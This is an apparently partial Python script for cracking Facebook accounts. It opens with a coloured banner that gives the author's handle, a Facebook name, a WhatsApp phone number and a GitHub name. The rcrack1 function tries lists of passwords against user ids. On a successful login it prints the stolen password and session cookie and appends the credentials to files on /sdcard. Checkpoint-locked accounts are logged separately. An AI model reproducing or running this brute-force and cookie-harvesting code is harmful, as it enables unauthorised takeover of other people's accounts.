...
\033[1;36m
  ...
  ____  ____    ____         ___       ______     ______     
 6MMMMb\`MM'    `MM'         `MMb     dMM`MM'     `M`MM'     
6M'    ` MM      MM           MMM.   ,PMM MM       M MM      
MM       MM      MM           M`Mb   d'MM MM       M MM      
YM.      MM      MM      ,M   M YM. ,P MM MM       M MM      
 YMMMMb  MMMMMMMMMM     ,dM   M `Mb d' MM MM       M MM      
     `Mb MM      MM    ,dMM   M  YM.P  MM MM       M MM      
      MM MM      MM   ,d MM   M  `Mb'  MM MM       M MM      
      MM MM      MM  ,d  MM   M   YP   MM YM       M MM      
L    ,M9 MM      MM ,d   MM   M   `'   MM  8b     d8 MM    / 
MYMMMM9 _MM_    _MM_MMMMMMMM _M_      _MM_  YMMMMM9 _MMMMMMM 
                         MM                                  
                         MM                                  
                         MM
                           
\033[1;36m═════════════════════════════════════════════════════════════
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m MRSH4MUL
\033[1;36m =[FACEBOOK]=  \033[1;36m  \033[1;36m MD SHIMUL
\033[1;36m =[WHATSAPP]=  \033[1;36m  \033[1;36m +8801975549322
\033[1;36m =[GITHUB]=  \033[1;36m   \033[1;36mMRSH4MUL
...
class Main:
    def __init__(self):
        ...
        os.system("clear")
        print(logo)
        os.system('xdg-open https://facebook.com/groups/824909892898955/')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;36m=[%sMR-SHIMUL\033[1;36m]=\033[1;34m∆\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m∆\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
           ...
           'user-agent': 'pro',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m=[SHIMUL-OK💚]= {uid}|{ps}\n\033[1;32m=[COOKIE-💙]= \033[1;31m{coki}")
                open('/sdcard/SHIMUL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m=[SHIMUL-LK💔]= {uid}|{ps}")
                open('/sdcard/SHIMUL-LK.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
